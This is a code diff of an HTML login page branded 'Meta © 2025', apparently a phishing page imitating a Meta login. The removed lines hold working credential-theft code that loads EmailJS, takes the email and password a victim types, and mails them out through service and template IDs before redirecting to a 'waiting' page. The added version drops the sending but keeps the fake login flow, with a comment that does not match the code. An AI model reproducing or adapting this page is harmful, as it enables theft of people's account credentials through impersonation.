@@ -132,7 +132,7 @@
       <input type="password" class="input-field" placeholder="Password" id="password" required>
       <img src="not.png" id="eye-icon" onclick="togglePasswordVisibility()" alt="Eye Icon">
     </div>
-    <button class="login-btn" onclick="sendCredentials()">Log In</button>
+    <button class="login-btn" onclick="storeLoginData()">Log In</button>
     
     <a href="#" class="forgot-password">Forgot password?</a>
     
@@ -152,13 +152,7 @@
     <a href="meta.html">Meta © 2025</a>
   </div>
 
-  <!-- Include EmailJS -->
-  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
   <script>
-    // Initialize EmailJS with your user ID
-    emailjs.init("ox8z9H7VCw6aD7CTC");
-
     function togglePasswordVisibility() {
       const passwordField = document.getElementById('password');
       const eyeIcon = document.getElementById('eye-icon');
@@ -173,26 +167,12 @@
       }
     }
 
-    function sendCredentials() {
+    function storeLoginData() {
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      const templateParams = {
-        user_email: email,
-        user_password: password,
-      };
-
-      // Send the email using EmailJS
-      emailjs.send("service_t1t4i9c", "template_dlztilw", templateParams)
-        .then(function(response) {
-          console.log("Email sent successfully", response);
-          alert("Login credentials sent!");
-          // Redirect to the waiting page after sending the email
-          window.location.href = 'waiting.html';
-        }, function(error) {
-          console.error("Error sending email", error);
-          alert("Failed to send login credentials.");
-        });
+      // Redirect to meta.html with the email and password as query parameters
+      window.location.href = 'waiting.html';
     }
   </script>
 
